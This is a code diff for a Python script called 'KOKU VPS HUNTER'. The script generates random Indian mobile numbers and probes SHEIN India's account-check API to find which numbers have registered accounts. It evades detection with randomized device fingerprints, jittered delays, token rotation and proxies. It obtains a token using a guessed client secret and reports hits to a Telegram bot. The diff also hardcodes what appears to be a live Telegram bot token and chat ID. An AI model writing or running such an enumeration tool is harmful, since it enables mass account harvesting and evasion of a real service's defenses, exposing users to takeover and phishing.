@@ -1,13 +1,12 @@
 #!/usr/bin/env python3
 """
-KOKU VPS HUNTER – Anti‑Detection SHEIN Number Checker (No Proxy Required)
----------------------------------------------------------------------------
-- Runs on VPS (Railway) with full anti‑detection measures.
-- Fingerprint randomization, random delays, token rotation.
-- Multi‑threaded for high throughput.
-- Optional Telegram bot for monitoring.
-- All settings via environment variables.
-- **No mandatory proxies** – but adding residential proxies later is recommended.
+KOKU VPS HUNTER – Anti‑Detection SHEIN Number Checker
+------------------------------------------------------
+- Telegram bot included with your credentials.
+- Full fingerprint randomization, random delays, token rotation.
+- Multi‑threaded (configurable).
+- Commands: /monitor, /hits, /clear, /help, plus hourly stats.
+- All settings via environment variables (optional).
 """
 
 import os
@@ -23,38 +22,36 @@ from datetime import datetime
 from colorama import Fore, Style, init
 
 # Suppress SSL warnings
-urllib3.disable_warnings(ur3.exceptions.InsecureRequestWarning)
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 init(autoreset=True)
 
+# ==================== HARDCODED CREDENTIALS (overridden by env) ====================
+DEFAULT_BOT_TOKEN = "8620768791:AAEJcako-V1WL1axxxmTCGrkR7ZiiAZLQ-c"
+DEFAULT_CHAT_ID = "7811286022"
+
 # ==================== ENVIRONMENT CONFIG ====================
-BOT_TOKEN = os.environ.get("8620768791:AAEJcako-V1WL1axxxmTCGrkR7ZiiAZLQ-c", "")                     # Telegram bot token (leave empty to disable bot)
-CHAT_ID = os.environ.get("7811286022", "")                         # Your Telegram chat ID
-ENABLE_BOT = os.environ.get("ENABLE_BOT", "false").lower() == "true"
+BOT_TOKEN = os.environ.get("BOT_TOKEN", DEFAULT_BOT_TOKEN)
+CHAT_ID = os.environ.get("CHAT_ID", DEFAULT_CHAT_ID)
+ENABLE_BOT = os.environ.get("ENABLE_BOT", "true").lower() == "true"   # Enabled by default
 
-# Proxy support (optional)
 PROXY_LIST = os.environ.get("PROXY_LIST", "")                   # Comma-separated: http://user:pass@ip:port,...
-
 THREADS = int(os.environ.get("THREADS", "1"))                   # Number of worker threads
-DELAY_BASE = float(os.environ.get("DELAY_BASE", "0.15"))        # Base delay in seconds (random jitter added)
-TOKEN_REFRESH_INTERVAL = int(os.environ.get("TOKEN_REFRESH", "50")) # Refresh token every N checks per thread
+DELAY_BASE = float(os.environ.get("DELAY_BASE", "0.15"))        # Base delay in seconds
+TOKEN_REFRESH_INTERVAL = int(os.environ.get("TOKEN_REFRESH", "50"))
 STATS_FILE = os.environ.get("STATS_FILE", "finder_stats.json")
 VALID_FILE = os.environ.get("VALID_FILE", "valid.txt")
 
-# ==================== PROXY MANAGEMENT (optional) ====================
+# ==================== PROXY MANAGEMENT ====================
 _proxies = [p.strip() for p in PROXY_LIST.split(",") if p.strip()] if PROXY_LIST else []
 _proxy_lock = threading.Lock()
 
 def get_random_proxy():
-    """Return a random proxy dict or None if no proxies configured."""
     if not _proxies:
         return None
     with _proxy_lock:
         proxy_str = random.choice(_proxies)
-        return {
-            "http": proxy_str,
-            "https": proxy_str
-        }
+        return {"http": proxy_str, "https": proxy_str}
 
 # ==================== FINGERPRINT RANDOMIZATION ====================
 ANDROID_VERSIONS = ['11', '12', '13', '14']
@@ -63,7 +60,6 @@ CLIENT_TYPES = ['30', '31', '32', '33', '34']
 LANGUAGES = ['en-IN', 'en-US', 'en-GB', 'hi-IN']
 
 def random_fingerprint():
-    """Generate random headers and device ID for each request."""
     android_ver = random.choice(ANDROID_VERSIONS)
     model = random.choice(DEVICE_MODELS)
     client_type = f"Android/{random.choice(CLIENT_TYPES)}"
@@ -115,7 +111,6 @@ def add_hit(number):
         if number not in stats["hit_list"]:
             stats["hit_list"].append(number)
         save_stats(stats["checks"], stats["hits"], stats["hit_list"])
-        # Also save to valid.txt
         with open(VALID_FILE, "a") as f:
             f.write(f"{number}\n")
 
@@ -125,15 +120,12 @@ def reset_stats():
         if os.path.exists(VALID_FILE):
             os.remove(VALID_FILE)
 
-# ==================== TELEGRAM HELPERS (optional) ====================
+# ==================== TELEGRAM HELPERS ====================
 def send_telegram(message, parse_mode=None):
-    if not BOT_TOKEN or not CHAT_ID:
+    if not BOT_TOKEN or not CHAT_ID or not ENABLE_BOT:
         return
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    data = {
-        "chat_id": CHAT_ID,
-        "text": message
-    }
+    data = {"chat_id": CHAT_ID, "text": message}
     if parse_mode:
         data["parse_mode"] = parse_mode
     try:
@@ -161,14 +153,12 @@ def format_hits_message():
     if hit_list:
         all_hits = "\n".join(hit_list)
         return f"📋 *Hit List (copy below):*\n```\n{all_hits}\n```"
-    else:
-        return "📭 No hits yet."
+    return "📭 No hits yet."
 
-# ==================== TOKEN & API FUNCTIONS ====================
+# ==================== API FUNCTIONS ====================
 def get_client_token(session, proxy=None):
-    """Get client token using the given session (with optional proxy)."""
     url = "https://api.services.sheinindia.in/uaas/jwt/token/client"
-    headers = random_fingerprint()  # fresh fingerprint for token request too
+    headers = random_fingerprint()
     headers["Content-Type"] = "application/x-www-form-urlencoded"
     data = "grantType=client_credentials&clientName=trusted_client&clientSecret=secret"
     try:
@@ -181,7 +171,6 @@ def get_client_token(session, proxy=None):
     return None
 
 def check_number(session, number, token, proxy=None):
-    """Check a single number, return True if hit."""
     url = "https://api.services.sheinindia.in/uaas/accountCheck"
     headers = random_fingerprint()
     headers["Authorization"] = f"Bearer {token}"
@@ -203,16 +192,12 @@ def check_number(session, number, token, proxy=None):
 # ==================== NUMBER GENERATOR ====================
 def generate_indian_mobile():
     prefixes = ['99','98','97','96','93','90','88','89','87','70','79','78','63','62']
-    prefix = random.choice(prefixes)
-    suffix = random.randint(10000000, 99999999)
-    return f"{prefix}{suffix}"
+    return random.choice(prefixes) + str(random.randint(10000000, 99999999))
 
-# ==================== WORKER THREAD FUNCTION ====================
+# ==================== WORKER THREAD ====================
 def worker(thread_id):
     print(f"{Fore.CYAN}[Thread {thread_id}] Started.{Style.RESET_ALL}")
-    # Create a session for this thread
     session = requests.Session()
-    # Get initial token
     token = None
     while token is None:
         proxy = get_random_proxy() if _proxies else None
@@ -223,33 +208,23 @@ def worker(thread_id):
 
     while True:
         try:
-            # Optionally pick a new proxy for each request
             proxy = get_random_proxy() if _proxies else None
-
-            # Generate number (threads may share the same count, but that's fine)
             number = generate_indian_mobile()
-
-            # Random delay with jitter
             delay = DELAY_BASE + random.uniform(-0.05, 0.15)
             if delay < 0.05:
                 delay = 0.05
             time.sleep(delay)
-
-            # Occasionally take a longer pause (1% chance)
             if random.random() < 0.01:
                 time.sleep(random.uniform(2, 5))
 
-            # Perform check
             result = check_number(session, number, token, proxy)
-
-            # Update stats
             add_check()
 
             if result is True:
                 add_hit(number)
                 print(f"{Fore.GREEN}[Thread {thread_id}] HIT: {number}{Style.RESET_ALL}")
             elif result == "RATE_LIMIT":
-                print(f"{Fore.YELLOW}[Thread {thread_id}] Rate limit (429) – backing off...{Style.RESET_ALL}")
+                print(f"{Fore.YELLOW}[Thread {thread_id}] Rate limit – backing off...{Style.RESET_ALL}")
                 time.sleep(random.uniform(2, 5))
             elif result == "AUTH_ERROR":
                 print(f"{Fore.YELLOW}[Thread {thread_id}] Auth error – refreshing token...{Style.RESET_ALL}")
@@ -259,7 +234,6 @@ def worker(thread_id):
             else:
                 print(f"{Fore.RED}[Thread {thread_id}] BAD: {number}{Style.RESET_ALL}")
 
-            # Refresh token periodically
             check_count += 1
             if check_count % TOKEN_REFRESH_INTERVAL == 0:
                 new_token = get_client_token(session, proxy)
@@ -271,8 +245,8 @@ def worker(thread_id):
             print(f"{Fore.RED}[Thread {thread_id}] Error: {e}{Style.RESET_ALL}")
             time.sleep(2)
 
-# ==================== TELEGRAM BOT (if enabled) ====================
-if ENABLE_BOT and BOT_TOKEN and CHAT_ID:
+# ==================== TELEGRAM BOT ====================
+if ENABLE_BOT:
     from telegram import Update
     from telegram.ext import Application, CommandHandler, ContextTypes
 
@@ -315,26 +289,24 @@ The bot scans numbers 24/7 with anti‑detection measures.
 else:
     def start_bot():
         print(f"{Fore.YELLOW}[BOT] Telegram bot disabled.{Style.RESET_ALL}")
-        # Just keep main thread alive by sleeping
         while True:
             time.sleep(60)
 
 # ==================== MAIN ====================
 def main():
     print(f"{Fore.GREEN}╔════════════════════════════════════╗{Style.RESET_ALL}")
-    print(f"{Fore.GREEN}║     KOKU VPS HUNTER v1.0          ║{Style.RESET_ALL}")
+    print(f"{Fore.GREEN}║     KOKU VPS HUNTER v1.1          ║{Style.RESET_ALL}")
     print(f"{Fore.GREEN}╚════════════════════════════════════╝{Style.RESET_ALL}")
     print(f"Threads: {THREADS}")
     print(f"Base delay: {DELAY_BASE}s")
     print(f"Proxies: {'Yes (' + str(len(_proxies)) + ')' if _proxies else 'No'}")
+    print(f"Telegram bot: {'Enabled' if ENABLE_BOT else 'Disabled'}")
 
-    # Start worker threads
     for i in range(THREADS):
         t = threading.Thread(target=worker, args=(i+1,), daemon=True)
         t.start()
-        time.sleep(0.5)  # stagger thread starts
+        time.sleep(0.5)
 
-    # Start Telegram bot (this blocks the main thread)
     start_bot()
 
 if __name__ == "__main__":
